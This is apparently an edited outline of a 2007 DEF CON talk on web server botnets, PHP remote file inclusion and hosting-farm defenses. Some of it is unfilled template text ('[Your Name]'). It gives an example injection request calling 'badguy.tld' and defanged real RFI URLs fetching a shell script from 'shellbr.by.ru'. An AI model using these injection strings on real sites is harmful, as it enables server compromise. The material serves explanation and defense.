# Web Server Botnets and Hosting Farms as Attack Platforms

## Presentation by Gadi Evron â€“ Beyond Security at DEF CON 15, 2007

### About Me
- **Who I am:** [Your Name]
- **What I do:** [Your Role/Expertise]
- **Where I work:** [Your Organization]

### Regular Malware
- **Often:**
  - **Platform-specific (Architecture, OS):** Propagates via vulnerabilities in web servers, mail clients, or other remote-accessible services.
  - **Social Engineering:** Exploits user "gullibility."
  - **Propagation:** Randomly spreads and primarily affects desktops.

### Web Server Malware
- **Often:**
  - **Cross-platform:** Any web daemon supporting scripting languages.
  - **Propagation:** Uses search engines like Google (e.g., "Powered by phpBB").
  - **Targeted Propagation:** From a pre-selected pool of targets.
  - **Affects Servers:** Primarily impacts web servers.

### Key Points
- **Web Server Malware:**
  - Cross-platform and has infected a significant number of web servers, making them ready to be controlled in botnets.
- **Attack Platforms:**
  - Collocation facilities, ISP server farms, hosting providers, etc.

### Previous Work
- **PHP Shells:** Generally explored.
- **File Inclusion Attacks (RFI):** Thoroughly examined.
- **R57shell Analysis:** Analyzed by Joe Stewart, SecureWorks (formerly LURHQ).

### New Research
- **"Web Server Botnets and Server Farms as Attack Platforms":** By Kfir Damari, Noam Rathaus, and myself. Published in Virus Bulletin, February 1, 2007.
- **"Know Your Enemy: Web Application Threats":** By Jamie Riden, Ryan McGeehan, Brian Engert, Michael Mueter. The Honeynet Project, February 7, 2007.

### Injection Techniques
- **File Inclusions:** Vulnerabilities in web applications that allow an attacker to execute a script by including the file in an existing script (e.g., using the `include()` function in PHP).
- **Other Vulnerabilities:** URL parsing code execution, POST vulnerabilities, and arbitrary file upload vulnerabilities.

### Example of an Injection
- **HTTP Request:**
  ```
  index.php?page=http://badguy.tld/malware.cmd?cmd=ls
  ```
- **Resulting PHP Code:**
  - Causes the web server to act as a client and download the malicious software.

### Main Types of Web Server Malware
- **Foothold Grabbers (Beachhead):** Establish initial control.
- **Remote Shell:** Elaborate compromise tool.
- **Bot:** Used for various malicious activities.

### Main Uses for Web Server Malware
- **Anonymous Messaging**
- **Spam**
- **Defacement**
- **Botnets**

### Example
- **OwneD By [GaspeR]`- Group ShellBR:**
  - IRC: irc.undernet.org, Channel: #ShellBRA
  - Example URLs:
    - `hxxp://wxw.che.yzu.edu.tw/Menu12/index.php?id=hxxp://shellbr.by.ru/cmd.txt?`
    - `hxxp://wxw.cheapcheapsale.com/index.php3?function=hxxp://shellbr.by.ru/cmd.txt?`
    - `hxxp://wxw.chentaiji.pl/index.php?id=hxxp://shellbr.by.ru/cmd.txt?`

### New Malware Discovery
- **C99shell:**
  - Modified by Psych0, uses PHP's `eval` function to hide itself in a base64 encoded block of data, which is also "encrypted" by rotating characters.

### Attack Platforms
- **Low-cost Hosting:**
  - 2-3K websites per box.
  - Users can run any web application, mostly PHP.
  - PHP has numerous vulnerabilities due to its open-source nature and poor security practices.

### Detection and Mitigation
- **Vulnerability Scanning (VA):** Look for known "bads" on the system.
- **Patching:** User responsibility, but may take time or not happen.
- **Investment:**
  - Contact users.
  - Patch the website.
  - Clean the server.

### Solutions
- **Disable in PHP:**
  - `allow_url_fopen`, `allow_url_include`.
- **Virtual Environments/Chrooted Users:** Cost considerations.
- **Best Practices:**
  - Do not allow surfing from a web server.
  - Use `mod_security`.
  - Implement your own best practices.
  - Quietly patch known web applications.

### Current State
- **Battlefield with no escalation by good guys:**
  - Over-time, aggregated attacker IP addresses remain the same in over 85% of cases.
  - Comparable to SMTP spam open relay days.

### The Web Honeynet Task Force
- **Members:**
  - 14 current members, including two of the largest colos and hosting farms.
- **Functions:**
  - Malware gathering.
  - C&C discovery.
  - IP blacklists.
  - URL blacklists.
  - Web server antivirus (proposed).

### Impact
- **IIS and Linux Botnets:**
  - Defacements, spam bots, stolen databases.
- **Scale and Cost:**
  - Significant impact with minimal industry or community awareness.

### Questions?

---

This revised version aims to provide a more structured, clear, and professional presentation of the original content.